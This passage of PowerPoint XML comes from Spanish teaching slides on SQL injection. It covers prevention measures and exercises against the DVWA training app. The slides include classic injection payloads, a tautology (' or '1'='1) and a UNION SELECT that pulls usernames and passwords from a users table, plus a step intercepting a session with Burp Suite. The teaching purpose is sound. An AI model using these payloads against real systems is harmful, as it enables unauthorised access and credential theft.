              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección SQL: prevención</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="290284" y="824845"/>
            <a:ext cx="9343950" cy="544274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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Realizando un escáner de Vulnerabilidades (se verá más adelante)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Parametrización (visto previamente)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Procedimientos en BBDD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Validar entrada</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>PHP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>JavaScript:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>Python </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Imagen 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71495B54-D8C0-B149-05DC-2BB800C18BCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3366792" y="3327665"/>
            <a:ext cx="6088293" cy="1298105"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Imagen 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CC62106-E270-FF98-781F-C4F79D3859C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3366792" y="4731804"/>
            <a:ext cx="5063998" cy="1988481"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rectángulo: esquinas redondeadas 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FC42F6A-3707-F8BD-E406-3733637AFA44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5693790" y="3685880"/>
            <a:ext cx="2007909" cy="25452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Rectángulo: esquinas redondeadas 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09B3F644-DFFC-6859-B1B4-0A92536E522A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5092045" y="5746469"/>
            <a:ext cx="1242767" cy="28668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8" name="Imagen 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FCAE227F-D0D8-41EC-1CFA-01C1D2EFF470}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4871098" y="2246269"/>
            <a:ext cx="7119383" cy="1046483"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectángulo: esquinas redondeadas 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D618B67-D41C-93E9-19D6-F4E725B0F38B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6573726" y="2520963"/>
            <a:ext cx="1733046" cy="31023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650368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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque - básica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C28CCBBF-7683-D2AC-2177-3C5A9B090F1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="408844" y="1332414"/>
            <a:ext cx="6094428" cy="464871"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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or</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'1' = '1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Tabla&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66BC229A-71E7-EE2C-383C-A66A575D7B63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3308532" y="1942398"/>
            <a:ext cx="5574935" cy="3911050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2787169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10114530" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – consultar número columnas</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>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93832A02-59F2-5256-47B0-7A5E03F15A27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="625252" y="1478324"/>
            <a:ext cx="5935804" cy="2793415"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87876EB2-F502-7E38-DE1C-EEE4870DC213}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5665002" y="3663995"/>
            <a:ext cx="6106876" cy="2675446"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1054372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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – inyección </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>union</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90934A75-D7F5-CB72-EFAF-36EDE0F46A6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1285280"/>
            <a:ext cx="6094428" cy="464871"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="630555" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>' UNION SELECT user, password FROM users#</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5" name="Imagen 4" descr="Imagen que contiene Tabla&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68E9736C-9D4E-419C-B994-EE561D8630BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815079" y="1983422"/>
            <a:ext cx="6017077" cy="3813440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3148908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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar el ataque básico</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="472892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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel medio con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E61C14B-8512-0E17-3A3E-1CE5D4A61A65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="653435" y="1622510"/>
            <a:ext cx="1533739" cy="1143160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3123E2E-EC08-CB47-05C4-8BB84DE5F3DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="577392" y="1187301"/>
            <a:ext cx="10775192" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Al cambiar a nivel medio de seguridad vemos que el nivel solo te permite seleccionar un valor de un desplegable</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5C2D799-6DEB-6CCD-B83A-EFA8A4B1F22B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523166" y="2862325"/>
            <a:ext cx="10525048" cy="2062103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Interceptar la sesión con el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Bur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60826578-C3D5-4BDE-54F7-DD0F09101B5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5001401" y="2308492"/>
            <a:ext cx="2700298" cy="3743972"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
